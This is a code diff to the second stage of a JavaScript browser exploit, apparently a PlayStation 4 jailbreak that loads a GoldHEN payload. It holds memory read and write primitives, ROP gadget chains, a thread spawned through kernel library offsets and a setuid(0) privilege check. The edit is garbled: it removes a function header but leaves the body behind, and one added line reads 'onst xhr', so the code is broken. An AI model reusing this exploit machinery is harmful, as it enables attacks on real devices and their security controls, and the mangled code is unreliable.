@@ -222,9 +222,33 @@ var stage2_ = function () {
 		window.nogc.push(bufView);
 		return p.read8(p.leakval(bufView).add32(0x10));
 	};
-function runPayload(path) {
-  const xhr = new XMLHttpRequest();
-  xhr.open("GET", path);
+ 
+ 
+
+	var spawn_thread = function (name, chaino) {
+		var new_thr = new rop();
+		var context = p.malloc(0x100);
+
+		p.write8(context.add32(0x0), window.gadgets["ret"]);
+		p.write8(context.add32(0x10), new_thr.stack);
+		new_thr.push(window.gadgets["ret"]);
+		chaino(new_thr);
+		p.write8(context, window.gadgets["ret"]);
+		p.write8(context.add32(0x10), new_thr.stack);
+
+		var retv = function () {
+			p.fcall(libKernelBase.add32(pthread_create_np_offset), context.add32(0x48), 0, libSceLibcInternalBase.add32(longJmpOffset), context, p.stringify(name));
+		}
+		window.nogc.push(new_thr);
+		window.nogc.push(context);
+
+		return retv;
+	}
+	var t = p.syscall("sys_setuid", 0);
+	if (t.low == 0) {
+
+onst xhr = new XMLHttpRequest();
+  xhr.open("GET", "./goldhen.bin");
   xhr.responseType = "arraybuffer";
   xhr.onreadystatechange = function () {
     // When request is "DONE"
@@ -275,29 +299,7 @@ function runPayload(path) {
 	  window.progress.innerHTML="network error";
   };
   xhr.send();
-  }
-	var spawn_thread = function (name, chaino) {
-		var new_thr = new rop();
-		var context = p.malloc(0x100);
-
-		p.write8(context.add32(0x0), window.gadgets["ret"]);
-		p.write8(context.add32(0x10), new_thr.stack);
-		new_thr.push(window.gadgets["ret"]);
-		chaino(new_thr);
-		p.write8(context, window.gadgets["ret"]);
-		p.write8(context.add32(0x10), new_thr.stack);
-
-		var retv = function () {
-			p.fcall(libKernelBase.add32(pthread_create_np_offset), context.add32(0x48), 0, libSceLibcInternalBase.add32(longJmpOffset), context, p.stringify(name));
-		}
-		window.nogc.push(new_thr);
-		window.nogc.push(context);
-
-		return retv;
-	}
-	var t = p.syscall("sys_setuid", 0);
-	if (t.low == 0) {
-		 runPayload("./goldhen.bin");
+		 
 		var loader_thr = spawn_thread("loader_thr", function (new_thr) {
 			new_thr.push(window.gadgets["pop rdi"]);
 			new_thr.push(payload_buffer);
